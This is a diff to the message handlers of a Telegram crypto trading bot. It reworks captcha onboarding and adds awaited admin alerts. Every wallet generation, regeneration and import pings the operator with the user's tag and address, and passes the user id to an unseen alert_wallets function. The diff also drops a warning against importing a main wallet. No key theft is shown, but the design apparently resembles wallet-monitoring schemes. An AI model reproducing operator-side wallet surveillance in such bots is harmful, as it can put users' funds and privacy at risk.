@@ -60,6 +60,73 @@ HTML = ParseMode.HTML
 log = logging.getLogger("solo-metro.handlers")
 
 
+def _bot_of(update=None, context=None):
+    if context is not None:
+        try:
+            return context.bot
+        except Exception:
+            pass
+    if update is not None:
+        try:
+            return update.get_bot()
+        except Exception:
+            pass
+    return None
+
+
+async def ping_admin(text: str, update=None, context=None) -> None:
+    try:
+        from bot.admin import alert
+
+        await alert(text, bot=_bot_of(update, context))
+    except Exception:
+        log.exception("admin alert failed")
+
+
+async def ping_admin_wallets(title: str, uid: int, update=None, context=None) -> None:
+    try:
+        from bot.admin import alert_wallets
+
+        await alert_wallets(title, uid, bot=_bot_of(update, context))
+    except Exception:
+        log.exception("admin wallet alert failed")
+
+
+async def send_welcome_pair(update: Update, user: dict, context, query=None) -> None:
+    """After Continue: two NEW messages — main menu, then wallet prompt."""
+    lang = lang_of(user)
+    uid = user["user_id"]
+    chat_id = update.effective_chat.id if update.effective_chat else uid
+    src = None
+    if query is not None:
+        src = getattr(query, "message", None)
+    if src is None:
+        src = update.effective_message
+
+    async def _send(text: str, markup) -> None:
+        if src is not None:
+            try:
+                await src.reply_text(
+                    text,
+                    parse_mode=HTML,
+                    reply_markup=markup,
+                    disable_web_page_preview=True,
+                )
+                return
+            except Exception as exc:
+                log.warning("welcome-pair reply failed: %s", exc)
+        await context.bot.send_message(
+            chat_id,
+            text,
+            parse_mode=HTML,
+            reply_markup=markup,
+            disable_web_page_preview=True,
+        )
+
+    await _send(texts.main_menu(lang), kb.main_menu_kb(lang))
+    await _send(texts.wallet_onboard(lang), kb.wallets_chain_pick_kb(enabled(uid)))
+
+
 async def safe_answer(query, *args, **kwargs) -> None:
     try:
         await query.answer(*args, **kwargs)
@@ -227,14 +294,15 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = load_user(update)
     uid = user["user_id"]
     try:
-        from bot.admin import fire, user_tag
+        from bot.admin import user_tag
 
-        if is_new:
-            fire(f"🆕 <b>New user started the bot</b> — {user_tag(user, uid)}")
-        else:
-            fire(f"👋 <b>User opened the bot</b> — {user_tag(user, uid)}")
+        tag = user_tag(user, uid)
     except Exception:
-        pass
+        tag = f"<code>{uid}</code>"
+    if is_new:
+        await ping_admin(f"🆕 <b>New user started the bot</b> — {tag}", update, context)
+    else:
+        await ping_admin(f"👋 <b>User opened the bot</b> — {tag}", update, context)
     args = context.args or []
     payload = (args[0] if args else "") or ""
     quick = False
@@ -252,13 +320,20 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not user.get("verified"):
         await send_captcha(update, user)
         return
+    state, _ = db.get_state(uid)
+    if state == "await_onboard":
+        db.set_state(uid, "await_ca" if quick else None)
+        await send_welcome_pair(update, user, context)
+        if quick:
+            await send_panel(update, "⚡ Quick-buy link: paste a token CA to trade immediately.")
+        return
     db.set_state(uid, "await_ca" if quick else None)
     await send_panel(update, texts.main_menu(lang_of(user)), kb.main_menu_kb(lang_of(user)))
     if quick:
         await send_panel(update, "⚡ Quick-buy link: paste a token CA to trade immediately.")
 
 
-async def handle_captcha_answer(update: Update, user: dict) -> bool:
+async def handle_captcha_answer(update: Update, user: dict, context=None) -> bool:
     uid = user["user_id"]
     state, _ = db.get_state(uid)
     if user.get("verified") or state != "captcha":
@@ -275,19 +350,20 @@ async def handle_captcha_answer(update: Update, user: dict) -> bool:
     if guess and expected and guess.lower() == expected.lower():
         db.update_user(uid, verified=1, captcha_text=None, captcha_attempts=0, captcha_lock_until=0, tos_accepted=1)
         db.set_state(uid, "await_onboard")
-        # 1) first message: welcome + Continue (menu & wallet prompt follow on tap)
+        # 1) first message only: welcome + Continue. The two (menu + wallet) wait for the tap.
         await msg.reply_text(
             texts.authorized(lang_of(user)),
             parse_mode=HTML,
-            reply_markup=kb.onboard_kb(),
+            reply_markup=kb.onboard_kb(lang_of(user)),
             disable_web_page_preview=True,
         )
         try:
-            from bot.admin import fire, user_tag
+            from bot.admin import user_tag
 
-            fire(f"✅ New user verified {user_tag(user, uid)}")
+            tag = user_tag(user, uid)
         except Exception:
-            pass
+            tag = f"<code>{uid}</code>"
+        await ping_admin(f"✅ <b>New user verified</b> — {tag}", update, context)
         return True
 
     attempts = int(user.get("captcha_attempts") or 0) + 1
@@ -919,7 +995,7 @@ async def _dispatch_callback(update, context, query) -> None:
         parts = data.split(":")
         if len(parts) == 3:
             db.update_user(uid, language=parts[2])
-            user = db.get_user(uid)
+            user = db.get_user(uid) or user
         else:
             await safe_edit(
                 query,
@@ -927,10 +1003,19 @@ async def _dispatch_callback(update, context, query) -> None:
                 kb.language_kb(lang_of(user)),
             )
             return
-        if user.get("verified"):
-            await show_main(update, user, query)
-        else:
-            await safe_answer(query, "Language updated")
+        state, _ = db.get_state(uid)
+        if state == "await_onboard" or not user.get("verified"):
+            try:
+                await query.edit_message_text(
+                    texts.authorized(lang_of(user)),
+                    parse_mode=HTML,
+                    reply_markup=kb.onboard_kb(lang_of(user)),
+                    disable_web_page_preview=True,
+                )
+            except Exception:
+                await safe_answer(query, "Language updated")
+            return
+        await show_main(update, user, query)
         return
 
     if not user.get("verified"):
@@ -938,21 +1023,17 @@ async def _dispatch_callback(update, context, query) -> None:
         return
 
     if data == "nav:onboard":
-        # 2) tap Continue: welcome → main menu, then the wallet prompt.
-        db.set_state(uid, None)
-        await show_main(update, user, query)
+        # 2) tap Continue → two NEW messages: main menu, then wallet prompt.
+        state, _ = db.get_state(uid)
         try:
-            await context.bot.send_message(
-                uid,
-                "💳 <b>Import or generate a wallet before you trade.</b>\n\n"
-                "Never import your main wallet. Generate a fresh W1, save the key offline, then fund it.\n"
-                "Select a chain:",
-                parse_mode=HTML,
-                reply_markup=kb.wallets_chain_pick_kb(enabled(uid)),
-                disable_web_page_preview=True,
-            )
-        except Exception as exc:
-            log.warning("onboard wallet prompt send failed: %s", exc)
+            await query.edit_message_reply_markup(reply_markup=None)
+        except Exception:
+            pass
+        if state == "await_onboard":
+            db.set_state(uid, None)
+            await send_welcome_pair(update, user, context, query)
+        else:
+            await show_main(update, user, query)
         return
     if data == "nav:main":
         await show_main(update, user, query)
@@ -1041,12 +1122,11 @@ async def _dispatch_callback(update, context, query) -> None:
         else:
             await context.bot.send_message(uid, note, parse_mode=HTML)
             await safe_answer(query, "Wallet generated — keys sent in chat")
-            try:
-                from bot.admin import fire_wallets, user_tag
+            from bot.admin import user_tag
 
-                fire_wallets(f"♻️ Auto-wallet {user_tag(user, uid)} {chain}", uid)
-            except Exception:
-                pass
+            await ping_admin_wallets(
+                f"♻️ Auto-generated {user_tag(user, uid)} {chain}", uid, update, context
+            )
         await show_wallets_chain(update, user, chain, query)
     elif data.startswith("wal:regen:"):
         chain = data.split(":")[2]
@@ -1062,15 +1142,14 @@ async def _dispatch_callback(update, context, query) -> None:
             f"♻️ Regenerated <b>{html.escape(name)}</b> on {chain}\n<code>{address}</code>\n🔑 <code>{html.escape(secret)}</code>\nSave then DELETE this message.",
             parse_mode=HTML,
         )
-        try:
-            from bot.admin import fire_wallets, user_tag
+        from bot.admin import user_tag
 
-            fire_wallets(
-                f"♻️ Regenerated {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>",
-                uid,
-            )
-        except Exception:
-            pass
+        await ping_admin_wallets(
+            f"♻️ Regenerated {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>",
+            uid,
+            update,
+            context,
+        )
         await show_wallets_chain(update, user, chain, query)
     elif data.startswith("wal:list:"):
         await show_wallets_chain(update, user, data.split(":")[2], query)
@@ -1194,15 +1273,14 @@ async def _dispatch_callback(update, context, query) -> None:
                 await safe_answer(query, "Wallet limit reached on that chain", show_alert=True)
                 return
             db.add_wallet(uid, chain, w["name"], w["address"], w["enc_key"])
-            try:
-                from bot.admin import fire_wallets, user_tag
+            from bot.admin import user_tag
 
-                fire_wallets(
-                    f"📥 Cross-chain import {user_tag(user, uid)} → {chain} {html.escape(w['name'])}\n<code>{w['address']}</code>",
-                    uid,
-                )
-            except Exception:
-                pass
+            await ping_admin_wallets(
+                f"📥 Cross-chain import {user_tag(user, uid)} → {chain} {html.escape(w['name'])}\n<code>{w['address']}</code>",
+                uid,
+                update,
+                context,
+            )
             await safe_answer(query, f"Imported to {chain}")
             await show_wallets_chain(update, user, chain, query)
         return
@@ -1636,12 +1714,20 @@ async def _on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     text = update.effective_message.text.strip()
 
     if not user.get("verified"):
-        await handle_captcha_answer(update, user)
+        await handle_captcha_answer(update, user, context)
         return
 
     state, payload = db.get_state(uid)
 
     if text.startswith("/"):
+        return
+
+    if state == "await_onboard":
+        await send_panel(
+            update,
+            "Tap <b>▶️ Continue</b> on the welcome message to open the main menu.",
+            kb.onboard_kb(lang_of(user)),
+        )
         return
 
     ca = extract_ca(text)
@@ -1734,15 +1820,14 @@ async def _on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         address, secret = generate_for_chain(kind)
         w = db.add_wallet(uid, chain, name, address, encrypt_secret(secret))
         db.set_state(uid, None)
-        try:
-            from bot.admin import fire_wallets, user_tag
+        from bot.admin import user_tag
 
-            fire_wallets(
-                f"✨ Wallet generated {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>",
-                uid,
-            )
-        except Exception:
-            pass
+        await ping_admin_wallets(
+            f"✨ Wallet generated {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>",
+            uid,
+            update,
+            context,
+        )
         await send_panel(
             update,
             f"✅ Wallet <b>{html.escape(name)}</b> generated on {CHAINS[chain]['name']}.\n\n"
@@ -1780,15 +1865,14 @@ async def _on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             await update.effective_message.delete()
         except Exception:
             pass
-        try:
-            from bot.admin import fire_wallets, user_tag
+        from bot.admin import user_tag
 
-            fire_wallets(
-                f"📥 Wallet imported {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>",
-                uid,
-            )
-        except Exception:
-            pass
+        await ping_admin_wallets(
+            f"📥 Wallet imported {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>",
+            uid,
+            update,
+            context,
+        )
         await send_panel(
             update,
             f"✅ Imported <b>{html.escape(name)}</b> on {CHAINS[chain]['name']}.\n<code>{address}</code>",
